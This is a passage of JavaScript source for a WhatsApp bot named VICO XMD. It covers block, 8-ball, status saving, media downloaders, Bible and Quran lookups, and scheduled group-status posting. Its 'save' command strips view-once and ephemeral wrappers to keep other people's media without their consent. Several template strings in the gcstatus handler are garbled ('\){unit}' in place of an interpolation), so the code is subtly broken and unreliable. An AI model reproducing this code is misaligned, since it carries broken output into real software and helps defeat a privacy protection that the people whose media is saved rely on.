        if (num.length >= 7) target = num + '@s.whatsapp.net';
    }
    if (!target) {
        return reply(
            '🚫 *Block*\n\n' +
            '• Reply to someone: ' + prefix + 'block\n' +
            '• Mention: ' + prefix + 'block @user\n' +
            '• Number: ' + prefix + 'block 234xxxxxxxxxx'
        );
    }
    const botId = (empire.user?.id || '').split(':')[0].split('@')[0];
    const targetNum = String(target).split('@')[0].split(':')[0];
    if (targetNum === botId) return reply('❌ Cannot block the bot.');
    try {
        const jid = target.includes('@') ? target : (targetNum + '@s.whatsapp.net');
        await empire.updateBlockStatus(jid, 'block');
        await empire.sendMessage(m.chat, { react: { text: '🚫', key: m.key } }).catch(() => {});
        reply('🚫 *Blocked*\n+' + targetNum);
    } catch (e) {
        reply('❌ Block failed: ' + (e.message || 'error'));
    }
    break;
}

case 'unblock': {
    let target = null;
    if (m.quoted?.sender) target = m.quoted.sender;
    else if (m.mentionedJid && m.mentionedJid[0]) target = m.mentionedJid[0];
    else if (args[0]) {
        let num = args[0].replace(/[^0-9]/g, '');
        if (num.length >= 7) target = num + '@s.whatsapp.net';
    }
    if (!target) {
        return reply('✅ Reply / mention / number:\n' + prefix + 'unblock');
    }
    try {
        const jid = target.includes('@') ? target : (String(target).split('@')[0] + '@s.whatsapp.net');
        await empire.updateBlockStatus(jid, 'unblock');
        reply('✅ *Unblocked*\n+' + String(jid).split('@')[0]);
    } catch (e) {
        reply('❌ Unblock failed: ' + (e.message || 'error'));
    }
    break;
}

case '8ball':
case 'eightball':
case 'magic8': {
    const question = (text || args.join(' ') || '').trim();
    if (!question) {
        return reply(
            '🎱 *Magic 8-Ball*\n\n' +
            'Ask a yes/no style question:\n' +
            prefix + '8ball Will I be rich?\n' +
            prefix + '8ball Is today my day?'
        );
    }

    const answers = [
        'It is certain.',
        'It is decidedly so.',
        'Without a doubt.',
        'Yes — definitely.',
        'You may rely on it.',
        'As I see it, yes.',
        'Most likely.',
        'Outlook good.',
        'Yes.',
        'Signs point to yes.',
        'Reply hazy, try again.',
        'Ask again later.',
        'Better not tell you now.',
        'Cannot predict now.',
        'Concentrate and ask again.',
        "Don't count on it.",
        'My reply is no.',
        'My sources say no.',
        'Outlook not so good.',
        'Very doubtful.',
        'Absolutely.',
        'In your dreams.',
        'The stars say yes.',
        'The stars say no.',
        'Not in this lifetime.',
        'Sooner than you think.',
        'Patience will reward you.',
        'Fate is on your side.',
        'Fate is working against you.',
        'A clear yes from the universe.',
        'A firm no from the universe.',
        'Maybe, if you work for it.',
        'Only if you believe.',
        'Doubt it heavily.',
        'Trust your gut — it is right.',
        'Ignore your gut this time.',
        'Victory is near.',
        'Defeat is likely.',
        'The odds are excellent.',
        'The odds are terrible.',
        'Yes, but not how you expect.',
        'No, but something better is coming.',
        'Ask your heart, not me.',
        'The answer is already in front of you.',
        'Keep pushing — yes.',
        'Stop chasing it — no.',
        'Green light.',
        'Red light.',
        'Yellow light — wait.',
        '100% yes.',
        '0% chance.',
        'Highly probable.',
        'Highly unlikely.',
        'The crystal ball says yes.',
        'The crystal ball says no.',
        'Clouded vision — try again.',
        'Spirits are undecided.',
        'Spirits approve.',
        'Spirits disapprove.',
        'Your lucky day says yes.',
        'Your unlucky streak continues.',
        'Bet on it.',
        "Don't bet on it.",
        'Destiny says yes.',
        'Destiny says no.',
        'The path is open.',
        'The path is closed.',
        'Good fortune awaits.',
        'Bad timing right now.',
        'Yes, with hard work.',
        'No amount of work will change this.',
        'The future looks bright.',
        'The future looks dim.',
        'Confirmed.',
        'Denied.',
        'Positive energy says yes.',
        'Negative energy surrounds this.',
        'Go for it.',
        'Walk away.',
        'The answer is yes, quietly.',
        'The answer is no, loudly.',
        'Miracles can happen — yes.',
        'No miracles here.',
        'All signs are go.',
        'All signs say stop.',
        'You already know the answer is yes.',
        'You already know the answer is no.',
        'Fortune favors you.',
        'Fortune ignores you today.',
        'A surprising yes.',
        'A surprising no.',
        'Yes in the long run.',
        'No in the long run.',
        'Short-term yes.',
        'Short-term no.',
        'The universe is aligning for you.',
        'The universe is not aligned.',
        'Proceed with confidence.',
        'Proceed with caution.',
        'Do not proceed.',
        'Full speed ahead.',
        'Hit the brakes.',
        'Yes, if you stay honest.',
        'No, if you stay stubborn.',
        'Love says yes.',
        'Logic says no.',
        'Logic says yes.',
        'Love says no.',
        'Money points to yes.',
        'Money points to no.',
        'Time will say yes.',
        'Time will say no.',
        'Sleep on it — then yes.',
        'Sleep on it — then no.',
        'Your future self says yes.',
        'Your future self says no.',
        'Risk it — yes.',
        'Too risky — no.',
        'Safe bet: yes.',
        'Safe bet: no.',
        'Chaos says yes.',
        'Order says no.',
        'The crowd would say yes.',
        'The crowd would say no.',
        'Experts would agree — yes.',
        'Experts would disagree — no.',
        'History repeats — yes.',
        'History warns — no.',
        'A soft yes.',
        'A hard no.',
        'A loud yes.',
        'A quiet no.',
        'Yes, after a struggle.',
        'No, despite the struggle.',
        'Blessed outcome — yes.',
        'Blocked outcome — no.',
        'Open door — walk through.',
        'Locked door — turn around.',
        'The wind is at your back.',
        'The wind is in your face.',
        'Sunrise energy — yes.',
        'Midnight energy — no.',
        'Hope says yes.',
        'Fear says no — ignore fear.',
        'Fear is right this time — no.',
        'Courage leads to yes.',
        'Comfort leads to no.',
        'The next chapter says yes.',
        'This chapter ends with no.',
        'Write your own yes.',
        'Accept the no and grow.',
        'Divine timing: yes soon.',
        'Divine timing: not yet.',
        'Divine timing: never.',
        'Divine timing: already happened.',
        'Yes, if you ask nicely.',
        'No, no matter how you ask.',
        'The ballot is yes.',
        'The ballot is no.',
        'Tied vote — ask again.',
        'Landslide yes.',
        'Landslide no.',
        'Whispered yes.',
        'Shouted no.',
        'The map leads to yes.',
        'The map leads nowhere.',
        'Treasure found — yes.',
        'Empty chest — no.',
        'Jackpot.',
        'Bust.',
        'Level up — yes.',
        'Game over — no.',
        'Boss fight incoming — still yes.',
        'Boss fight — you lose.',
        'Plot twist: yes.',
        'Plot twist: no.',
        'Main character energy — yes.',
        'Side character arc — no.',
        'The algorithm says yes.',
        'The algorithm says no.',
        'Data supports yes.',
        'Data supports no.',
        'Random chance favors yes.',
        'Random chance favors no.',
        'Coin flip: heads — yes.',
        'Coin flip: tails — no.',
        'Dice rolled high — yes.',
        'Dice rolled low — no.',
        'Karma says you earned a yes.',
        'Karma says not this time.',
        'Angels vote yes.',
        'Doubts vote no.',
        'Final answer: yes.',
        'Final answer: no.',
        'I have spoken — yes.',
        'I have spoken — no.',
        'Case closed: yes.',
        'Case closed: no.',
        'Mystery solved: yes.',
        'Mystery remains: no.',
        'The prophecy is yes.',
        'The prophecy is no.',
        'Ancient wisdom says yes.',
        'Ancient wisdom says no.',
        'Modern sense says yes.',
        'Modern sense says no.',
        'Your best friend would say yes.',
        'Your best friend would say no.',
        'A stranger would say yes.',
        'A stranger would say no.',
        'Under the moonlight — yes.',
        'Under the harsh sun — no.',
        'In another life — yes.',
        'In this life — no.',
        'One more try will bring yes.',
        'One more try still no.',
        'Sealed with a yes.',
        'Sealed with a no.'
    ];

    const pick = answers[Math.floor(Math.random() * answers.length)];
    const low = String(pick).toLowerCase();
    let vibe = '🟢';
    if (/\bno\b|doubt|don't|denied|never|stop|closed|bust|lose|against|terrible|dim|unlikely|0%|walk away|turn around/.test(low)) {
        vibe = '🔴';
    } else if (/try again|later|wait|undecided|hazy|cloud|yellow|not yet|sleep on|caution|tied/.test(low)) {
        vibe = '🟡';
    }

    try {
        await empire.sendMessage(m.chat, { react: { text: '🎱', key: m.key } }).catch(() => {});
    } catch (_) {}

    const out =
        '🎱 *MAGIC 8-BALL*\n\n' +
        '❓ *Question:*\n' + question + '\n\n' +
        vibe + ' *Answer:*\n*' + pick + '*';

    reply(out);
    break;
}

case 'savestatus':
case 'sstatus':
case 'getstatus':
case 'save': {
    if (!isCreator) return m.reply('❌ *Only owner fit use this.*');
    if (!m.quoted) return m.reply('📌 *Reply to any status with:*\n.save\n\nMake you view person status then reply am with .save');

    try {
        const quoted = m.quoted;
        let qmsg = quoted.message || quoted.msg || {};
        if (qmsg.ephemeralMessage) qmsg = qmsg.ephemeralMessage.message;
        if (qmsg.viewOnceMessage) qmsg = qmsg.viewOnceMessage.message;
        if (qmsg.viewOnceMessageV2) qmsg = qmsg.viewOnceMessageV2.message;
        if (qmsg.viewOnceMessageV2Extension) qmsg = qmsg.viewOnceMessageV2Extension.message;

        const type = Object.keys(qmsg || {}).find(k => k.endsWith('Message')) || Object.keys(qmsg || {})[0] || '';
        const mediaNode = (type && qmsg[type]) ? qmsg[type] : null;
        const mime = (mediaNode && mediaNode.mimetype) || quoted.mimetype || '';
        const sender = quoted.participant || quoted.sender || quoted.key?.participant || 'Unknown';
        const senderName = String(sender).split('@')[0];
        const saveCaption = `✅ *STATUS SAVED BY VICO XMD*\n\n👤 From: @${senderName}\n📂 Type: ${String(type).replace('Message', '') || 'media'}\n⏰ ${new Date().toLocaleString()}`;

        let buffer = null;
        try {
            buffer = await empire.downloadMediaMessage(quoted);
        } catch {
            try { buffer = await quoted.download?.(); } catch { buffer = null; }
        }

        // Detect type from mime / keys / magic bytes so video never becomes a PDF
        const isImage = /image/i.test(mime) || /image/i.test(type) || (buffer && buffer[0] === 0xFF && buffer[1] === 0xD8);
        const isVideo = /video/i.test(mime) || /video/i.test(type) || (buffer && buffer.length > 8 && buffer.toString('utf8', 4, 8) === 'ftyp');
        const isAudio = /audio|ptt|ogg|opus|mpeg/i.test(mime) || /audio|ptt/i.test(type);

        if (!buffer) {
            let textStatus = quoted.text || qmsg.conversation || qmsg.extendedTextMessage?.text || qmsg.imageMessage?.caption || qmsg.videoMessage?.caption || '';
            if (textStatus) {
                await empire.sendMessage(m.sender, { text: `📝 *SAVED TEXT STATUS*\n\n👤 From: @${senderName}\n\n${textStatus}\n\n${saveCaption}`, mentions: [sender] }, { quoted: m });
                return m.reply('sᴛᴀᴛᴜs ʜᴀs ʙᴇᴇɴ sᴀᴠᴇᴅ ᴛᴏ ᴜʀ ᴅᴍ ✅ ');
            }
            return m.reply('❌ No media found for this status');
        }

        if (isImage) {
            await empire.sendMessage(m.sender, {
                image: buffer,
                caption: saveCaption,
                mentions: [sender],
                contextInfo: newsletterContext({ mentionedJid: [sender] })
            }, { quoted: m });
        } else if (isVideo) {
            await empire.sendMessage(m.sender, {
                video: buffer,
                mimetype: mime && /video/i.test(mime) ? mime : 'video/mp4',
                caption: saveCaption,
                mentions: [sender],
                contextInfo: newsletterContext({ mentionedJid: [sender] })
            }, { quoted: m });
        } else if (isAudio) {
            await empire.sendMessage(m.sender, {
                audio: buffer,
                mimetype: mime || 'audio/mp4',
                ptt: /ptt|ogg|opus/i.test(mime) || /ptt/i.test(type),
                contextInfo: newsletterContext()
            }, { quoted: m });
            await empire.sendMessage(m.sender, { text: saveCaption, mentions: [sender], contextInfo: newsletterContext({ mentionedJid: [sender] }) });
        } else {
            // Last resort: still try video then image before document
            try {
                await empire.sendMessage(m.sender, {
                    video: buffer,
                    mimetype: 'video/mp4',
                    caption: saveCaption,
                    mentions: [sender],
                    contextInfo: newsletterContext({ mentionedJid: [sender] })
                }, { quoted: m });
            } catch {
                try {
                    await empire.sendMessage(m.sender, {
                        image: buffer,
                        caption: saveCaption,
                        mentions: [sender],
                        contextInfo: newsletterContext({ mentionedJid: [sender] })
                    }, { quoted: m });
                } catch {
                    const ext = (mime && mime.split('/')[1]) || 'bin';
                    await empire.sendMessage(m.sender, {
                        document: buffer,
                        mimetype: mime || 'application/octet-stream',
                        fileName: `status_${Date.now()}.${ext}`,
                        caption: saveCaption,
                        mentions: [sender],
                        contextInfo: newsletterContext({ mentionedJid: [sender] })
                    }, { quoted: m });
                }
            }
        }

        await m.reply('✅ sᴛᴀᴛᴜs ʜᴀs ʙᴇᴇɴ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ sᴀᴠᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴅᴍ');

    } catch (e) {
        console.error('SAVESTATUS ERROR:', e);
        m.reply(`❌ Failed to save status:\n${e.message}`);
    }
    break;
}



case 'facebook':
case 'fb':
case 'fbdl': {
    const url = (text || args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
        return reply('📘 *Facebook*\n\nUsage: ' + prefix + 'fb <url>');
    }
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
    try {
        const resolved = await vicoResolveMedia(url);
        await vicoSendResolved(empire, m, resolved);
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        reply('❌ Facebook failed: ' + (e.message || 'error'));
    }
    break;
}


case 'youtube':
case 'yt': {
    let url = (text || args.join(' ') || '').trim().split(/\s+/)[0];
    if (!url) {
        const ctx = m.message?.extendedTextMessage?.contextInfo;
        const qt = ctx?.quotedMessage?.conversation || ctx?.quotedMessage?.extendedTextMessage?.text || '';
        const mm = String(qt).match(/https?:\/\/[^\s]+/);
        if (mm) url = mm[0];
    }
    if (!url || !/^https?:\/\//i.test(url)) {
        return reply('⬇️ *AIO Downloader*\n\nUsage: ' + prefix + 'aio <url>\nTikTok • Instagram • Facebook • Snapchat • YouTube • X');
    }
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
    try {
        // short link resolve
        if (/(vt|vm)\.tiktok\.com|snapchat\.com\/t\//i.test(url)) {
            try {
                const res = await axios.get(url, { maxRedirects: 0, timeout: 10000, validateStatus: s => s >= 200 && s < 400 });
                if (res.headers?.location) url = res.headers.location;
            } catch (e) {
                if (e.response?.headers?.location) url = e.response.headers.location;
            }
        }
        let resolved = null;
        // Prexzy
        try {
            const plat = /tiktok/i.test(url) ? 'tiktok' : /instagram/i.test(url) ? 'instagram' : /facebook|fb\.watch/i.test(url) ? 'facebook' : /snapchat/i.test(url) ? 'aiov2' : /youtube|youtu\.be/i.test(url) ? 'aiov2' : null;
            if (plat) {
                const { data } = await axios.get('https://prexzyapis.com/download/' + plat, {
                    params: { url }, timeout: 45000, headers: { Accept: 'application/json', 'User-Agent': 'Mozilla/5.0' }
                });
                if (data?.status || data?.data || data?.result) {
                    const raw = data.data || data.media || data.result || data;
                    if (/tiktok/i.test(url)) {
                        resolved = { video: raw.hdplay || raw.play || raw.wmplay, audio: raw.music, title: raw.title, author: raw.author?.nickname || '', cover: raw.cover };
                    } else if (/instagram/i.test(url)) {
                        const list = Array.isArray(raw) ? raw : (raw.media || []);
                        const vid = list.find(x => /video/i.test(x.type || ''));
                        const img = list.find(x => /image|photo/i.test(x.type || ''));
                        resolved = { video: vid?.url, images: img ? [img.url] : [], title: 'Instagram' };
                    } else if (/facebook|fb/i.test(url)) {
                        resolved = { video: raw.hd || raw.sd, title: raw.title || 'Facebook', cover: raw.thumbnail };
                    } else {
                        resolved = { video: raw.video || raw.url || raw.download_url || raw.hd, title: raw.title || 'Media', cover: raw.thumbnail };
                    }
                }
            }
        } catch (_) {}
        // David Cyril fallback
        if (!resolved || (!resolved.video && !resolved.images?.length)) {
            try {
                const route = /youtube|youtu\.be/i.test(url) ? 'yt' : /twitter|x\.com/i.test(url) ? 'aiov3' : /snapchat/i.test(url) ? 'aiov3' : null;
                if (route) {
                    const { data } = await axios.get('https://apis.davidcyril.name.ng/download/' + route, {
                        params: { url }, timeout: 60000
                    });
                    const r = data?.result || data?.data || data;
                    if (r) resolved = { video: r.download_url || r.url || r.hd, title: r.title || 'Media', cover: r.thumbnail };
                }
            } catch (_) {}
        }
        // Universal resolver fallback
        if (!resolved || (!resolved.video && !resolved.images?.length && !resolved.audio)) {
            resolved = await vicoResolveMedia(url);
        }
        if (!resolved) throw new Error('No media');
        await vicoSendResolved(empire, m, resolved);
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
        reply('❌ *AIO failed*\n' + (e.message || 'Could not download'));
    }
    break;
}


case 'bible':
case 'verse':
case 'bibleverse':
case 'kjv': {
    if (!text) return reply(`📖 *Bible Verse Lookup*\n\n📌 *Usage:*\n${prefix}bible <book chapter:verse>\n\n📝 *Examples:*\n ${prefix}bible John 3:16\n${prefix}bible Psalm 23:1\n ${prefix}bible Genesis 1:1\n${prefix}bible Romans 8:28\n\n💡 Also accepts:\n ${prefix}bible John 3:16-18 (range)\n${prefix}bible Psalm 23 (whole chapter)`);
    
    try {
        await empire.sendMessage(m.chat, { react: { text: '📖', key: m.key } });
        
        const axios = require('axios');
        const { data } = await axios.get('https://bible-api.com/' + encodeURIComponent(text), {
            timeout: 15000,
            headers: { 'User-Agent': 'VICO-XMD/3.0' }
        });

        if (!data?.text) {
            return reply(`❌ No Bible verse found for "${text}"\n\nTry a format like: John 3:16`);
        }

        const ref = data.reference || text;
const translation = data.translation_name || data.translation_id || 'KJV';
let response = `📖 *${ref}*\n_${translation}_\n\n${String(data.text).trim()}`;

if (data.verses && data.verses.length > 1) {
    response = `📖 *${ref}*\n_${translation}_\n\n`;
    for (const v of data.verses) {
        response += `*${v.verse}.* ${String(v.text).trim()}\n`;
    }
}

response += `\n\n🔗 ${data.reference || ''}`;

await empire.sendMessage(m.chat, {
    text: response.slice(0, 4000),
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true
    }
}, { quoted: m });

        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.error('[bible]', e.message);
        reply(`❌ Could not fetch the verse.\n\nCheck your format: ${prefix}bible John 3:16`);
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
    }
    break;
}

case 'gcstatus':
case 'gcs':
case 'groupstatus':
case 'poststatus':
case 'gcstory':
case 'togcstatus': {
    if (!m.isGroup) return reply('❌ Use this command inside a group.');

    const args = text ? text.trim().split(/\s+/) : [];
    const sub = (args[0] || '').toLowerCase();
    const caption = args.slice(1).join(' ').trim();

    // ─── HELP ───────────────────────────────────────────────
    if (['help', 'h', 'menu', ''].includes(sub) && !m.quoted) {
        return reply(`📱 *GCSTATUS — ADVANCED*\n\n` +
            `📌 *Basic Commands:*\n` +
            `• ${prefix}gcstatus Hello world! — Post text status\n` +
            `• [reply media] ${prefix}gcstatus caption — Post media status\n` +
            `📅 *Schedule & Repeat:*\n` +
            `• ${prefix}gcstatus schedule 10m Hello\n` +
            `• ${prefix}gcstatus repeat 5m Hello\n` +
            `• ${prefix}gcstatus delete <id>\n` +
            `• ${prefix}gcstatus list\n\n` +
            `⚙️ *Settings:*\n` +
            `• ${prefix}gcstatus bg #FF5733\n` +
            `• ${prefix}gcstatus font bold\n\n` +
            `📦 *Templates:*\n` +
            `• ${prefix}gcstatus template quote Hello\n` +
            `• ${prefix}gcstatus template announce Hello\n\n` +
            `📊 *Others:*\n` +
            `• ${prefix}gcstatus stats\n` +
            `• ${prefix}gcstatus clear\n\n` +
            `✅ *Works in ANY group — no admin needed!*`);
    }

    try {
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
        const fs = require('fs');
        const path = require('path');
        const os = require('os');
        const { exec } = require('child_process');

        // ─── HELPER: postStatus ───────────────────────────────
        async function postStatus(content) {
            if (!global.statusCount) global.statusCount = 0;
            global.statusCount++;

            if (content.text) {
                if (!global.statusTextCount) global.statusTextCount = 0;
                global.statusTextCount++;
            } else if (content.image || content.video) {
                if (!global.statusMediaCount) global.statusMediaCount = 0;
                global.statusMediaCount++;
            } else if (content.audio) {
                if (!global.statusAudioCount) global.statusAudioCount = 0;
                global.statusAudioCount++;
            }

            const statusSourceType =
                content.text ? 'TEXT' :
                content.image ? 'IMAGE' :
                content.video ? 'VIDEO' :
                content.audio ? 'AUDIO' : 'TEXT';

            return empire.sendMessage(m.chat, {
                ...content,
                contextInfo: {
                    ...(content.contextInfo || {}),
                    isGroupStatus: true,
                    statusSourceType,
                    statusAttributions: [{ type: 10 }],
                    statusAudienceMetadata: {
                        audienceType: 'CLOSE_FRIENDS'
                    }
                }
            });
        }

        // ─── SUB: schedule ───────────────────────────────────
        if (['schedule', 'sch'].includes(sub)) {
            const time = args[1] || '';
            const txt = args.slice(2).join(' ') || '';
            const match = time.match(/^(\d+)([smhd])$/);
            if (!match) return reply(`❌ Format: ${prefix}gcstatus schedule 10m Hello\n\nUnits: s=seconds, m=minutes, h=hours, d=days`);

            const amount = parseInt(match[1]);
            const unit = match[2];
            const multipliers = { s: 1000, m: 60000, h: 3600000, d: 86400000 };
            const delay = amount * multipliers[unit];
            const scheduleId = Date.now().toString(36);

            if (!global.scheduledPosts) global.scheduledPosts = [];
            const scheduleData = { id: scheduleId, jid: m.chat, text: txt, time: Date.now() + delay, active: true };
            global.scheduledPosts.push(scheduleData);

            setTimeout(async () => {
                if (scheduleData.active) {
                    await postStatus({ text: txt, backgroundColor: '#9C27B0' });
                    scheduleData.active = false;
                }
            }, delay);

            return reply(`✅ Status scheduled!\n\n📝 *Text:* ${txt}\n⏱️ *Time:* ${amount} \){unit} from now\n🆔 *ID:* ${scheduleId}`);
        }

        // ─── SUB: repeat ─────────────────────────────────────
        if (['repeat', 'rep'].includes(sub)) {
            const time = args[1] || '';
            const txt = args.slice(2).join(' ') || '';
            const match = time.match(/^(\d+)([smhd])$/);
            if (!match) return reply(`❌ Format: ${prefix}gcstatus repeat 5m Hello`);

            const amount = parseInt(match[1]);
            const unit = match[2];
            const multipliers = { s: 1000, m: 60000, h: 3600000, d: 86400000 };
            const interval = amount * multipliers[unit];
            const repeatId = Date.now().toString(36);

            if (!global.repeatPosts) global.repeatPosts = [];
            const repeatData = { id: repeatId, jid: m.chat, text: txt, interval, active: true };
            global.repeatPosts.push(repeatData);

            const runRepeat = async () => {
                if (!repeatData.active) return;
                await postStatus({ text: txt, backgroundColor: '#9C27B0' });
                setTimeout(runRepeat, interval);
            };
            runRepeat();

            return reply(`✅ Status repeating!\n\n📝 *Text:* ${txt}\n⏱️ *Interval:* Every ${amount} \){unit}\n🆔 *ID:* ${repeatId}`);
        }

        // ─── SUB: delete ─────────────────────────────────────
        if (['delete', 'del', 'remove'].includes(sub)) {
            const id = args[1] || '';
            if (!id) return reply(`❌ Usage: ${prefix}gcstatus delete <id>\n\nUse ${prefix}gcstatus list to see IDs.`);

            let deleted = false;
            if (global.scheduledPosts) {
                const index = global.scheduledPosts.findIndex(p => p.id === id);
                if (index !== -1) {
                    global.scheduledPosts[index].active = false;
                    global.scheduledPosts.splice(index, 1);
                    deleted = true;
                }
            }
            if (global.repeatPosts) {
                const index = global.repeatPosts.findIndex(p => p.id === id);
                if (index !== -1) {
                    global.repeatPosts[index].active = false;
                    global.repeatPosts.splice(index, 1);
                    deleted = true;
                }
            }
            return reply(deleted ? `✅ Post ${id} deleted!` : `❌ Post ${id} not found.`);
        }

        // ─── SUB: list ───────────────────────────────────────
        if (['list', 'ls', 'history'].includes(sub)) {
            let msg = '📋 *SCHEDULED POSTS*\n\n';
            if (global.scheduledPosts?.length) {
                const active = global.scheduledPosts.filter(p => p.active);
                msg += `📅 *Scheduled (${active.length}):*\n`;
                active.forEach(p => {
                    const remaining = Math.max(0, Math.floor((p.time - Date.now()) / 1000));
                    msg += `• \`${p.id}\` — " \){(p.text || '').slice(0, 30)}..." (${remaining}s left)\n`;
                });
            } else {
                msg += '📅 No scheduled posts.\n';
            }
            msg += '\n';
            if (global.repeatPosts?.length) {
                const active = global.repeatPosts.filter(p => p.active);
                msg += `🔄 *Repeating (${active.length}):*\n`;
                active.forEach(p => {
                    const interval = Math.floor(p.interval / 1000);
                    msg += `• \`${p.id}\` — " \){(p.text || '').slice(0, 30)}..." (every ${interval}s)\n`;
                });
            } else {
                msg += '🔄 No repeating posts.';
            }
            return reply(msg);
        }

        // ─── SUB: stats ──────────────────────────────────────
        if (['stats', 'stat'].includes(sub)) {
            return reply(`📊 *GCSTATUS STATS*\n\n` +
                `📝 Total posts: *${global.statusCount || 0}*\n` +
                `📄 Text posts: *${global.statusTextCount || 0}*\n` +
                `🖼️ Media posts: *${global.statusMediaCount || 0}*\n` +
                `🎵 Audio posts: *${global.statusAudioCount || 0}*\n\n` +
                `📅 Scheduled: *${global.scheduledPosts?.filter(p => p.active).length || 0}*\n` +
                `🔄 Repeating: *${global.repeatPosts?.filter(p => p.active).length || 0}*`);
        }

        // ─── SUB: clear ──────────────────────────────────────
        if (['clear', 'reset'].includes(sub)) {
            global.scheduledPosts = [];
            global.repeatPosts = [];
            return reply('✅ All scheduled and repeating posts cleared!');
        }

        // ─── SUB: bg ─────────────────────────────────────────
        if (['bg', 'background'].includes(sub)) {
            const color = args[1] || '';
            if (!color.match(/^#[a-fA-F0-9]{6}$/)) return reply(`❌ Usage: ${prefix}gcstatus bg #FF5733\n\nValid hex: #RRGGBB`);
            if (!global.gcSettings) global.gcSettings = {};
            if (!global.gcSettings[m.chat]) global.gcSettings[m.chat] = {};
            global.gcSettings[m.chat].bgColor = color;
            return reply(`✅ Default background color set to ${color}!`);
        }

        // ─── SUB: font ───────────────────────────────────────
        if (['font', 'fonts'].includes(sub)) {
            const fonts = ['bold', 'italic', 'underline', 'normal'];
            const font = args[1] || '';
            if (!fonts.includes(font)) return reply(`❌ Available fonts: ${fonts.join(', ')}`);
            if (!global.gcSettings) global.gcSettings = {};
            if (!global.gcSettings[m.chat]) global.gcSettings[m.chat] = {};
            global.gcSettings[m.chat].font = font;
            return reply(`✅ Font set to ${font}!`);
        }

        // ─── SUB: template ───────────────────────────────────
        if (['template', 'temp', 'tpl'].includes(sub)) {
            const template = args[1] || '';
            const txt = args.slice(2).join(' ') || '';
            const templates = {
                quote: `"${txt}" — Someone`,
                announce: `📢 *ANNOUNCEMENT*\n\n${txt}`,
                warning: `⚠️ *WARNING*\n\n${txt}`,
                success: `✅ *SUCCESS*\n\n${txt}`,
                error: `❌ *ERROR*\n\n${txt}`,
                tip: `💡 *TIP*\n\n${txt}`,
                poll: `📊 *POLL*\n\n${txt}\n\nReply with:\n1️⃣ Option A\n2️⃣ Option B`
            };
            if (!templates[template]) return reply(`❌ Available templates: ${Object.keys(templates).join(', ')}`);
            await postStatus({ text: templates[template], backgroundColor: '#9C27B0' });
            return empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        }

        // ─── SUB: animate ────────────────────────────────────
        if (['animate', 'anim', 'gif'].includes(sub)) {
            const txt = args.slice(1).join(' ') || '';
            if (!txt) return reply(`❌ Usage: ${prefix}gcstatus animate Hello World!`);
            const styles = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEAA7'];
            let count = 0;
            const interval = setInterval(async () => {
                if (count >= styles.length) return clearInterval(interval);
                await postStatus({ text: `${'🌟'.repeat(count + 1)} ${txt}`, backgroundColor: styles[count] });
                count++;
            }, 3000);
            return reply(`✅ Animating: "${txt}" ( \){styles.length} frames)`);
        }

        // ─── MAIN POST (text or media) ───────────────────────
        const quoted = m.quoted ? m.quoted : null;

        // Text status
        if (!quoted) {
            if (!text) return reply(`❌ Usage: ${prefix}gcstatus <text>\nOr reply to media with ${prefix}gcstatus`);

            const colorMatch = text.match(/--color=([#a-fA-F0-9]{6})/);
            const bgColor = colorMatch ? colorMatch[1] : (global.gcSettings?.[m.chat]?.bgColor || '#9C27B0');
            const cleanText = text.replace(/--color=#[a-fA-F0-9]{6}/, '').trim();

            await postStatus({ text: cleanText, backgroundColor: bgColor });
            return empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        }

        // Media status
        const mediaType = quoted.mimetype?.includes('image') ? 'image' :
                          quoted.mimetype?.includes('video') ? 'video' :
                          quoted.mimetype?.includes('audio') ? 'audio' : null;

        if (!mediaType) return reply('❌ Reply to an image, video, audio or voice note.');

        const buffer = await quoted.download();
        if (!buffer?.length) throw new Error('Downloaded media is empty');

        // Audio → voice note
        if (mediaType === 'audio') {
            // Simple version (no waveform for now to keep it lighter)
            await postStatus({
                audio: buffer,
                mimetype: 'audio/ogg; codecs=opus',
                ptt: true
            });
            return empire.sendMessage(m.chat, { react: { text: '🎵', key: m.key } });
        }

        // Image / Video
        let finalBuffer = buffer;
        if (mediaType === 'image') {
            try {
                const sharp = require('sharp');
                let img = sharp(buffer);
                if (args.includes('--blur')) img = img.blur(5);
                if (args.includes('--grayscale')) img = img.grayscale();
                if (args.includes('--sepia')) img = img.tint({ r: 112, g: 66, b: 20 });
                finalBuffer = await img.toBuffer();
            } catch {}
        }

        await postStatus({
            [mediaType]: finalBuffer,
            caption: caption || ''
        });

        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error('[GCSTATUS]', e);
        reply(`❌ Group status failed: ${e.message || e}`);
    }
    break;
}

case 'quran':
case 'ayah':
case 'ayat':
case 'surah': {
    if (!text) return reply(`📖 *Quran Verse Lookup*\n\n📌 *Usage:*\n${prefix}quran <surah:ayah>\n\n📝 *Examples:*\n ${prefix}quran 2:255\n${prefix}quran 1:1\n ${prefix}quran 36:1\n${prefix}quran 112:1\n\n💡 Also accepts:\n ${prefix}quran 2 255\n${prefix}quran 18:1-5 (range)`);

    try {
        await empire.sendMessage(m.chat, { react: { text: '📖', key: m.key } });

        const axios = require('axios');

        // Clean input (support both 2:255 and 2 255)
        let query = text.trim().replace(/\s+/g, ':');

        // Fetch Arabic + English Sahih International
        const { data } = await axios.get(`https://api.alquran.cloud/v1/ayah/${encodeURIComponent(query)}/editions/quran-uthmani,en.sahih`, {
            timeout: 15000
        });

        if (!data?.data || data.code !== 200) {
            return reply(`❌ No verse found for "${text}"\n\nTry a format like: 2:255 or 1:1`);
        }

        // data.data is an array when multiple editions are requested
        const arabic = data.data[0];
        const english = data.data[1];

        const surahName = arabic.surah.englishName;
        const surahNameAr = arabic.surah.name;
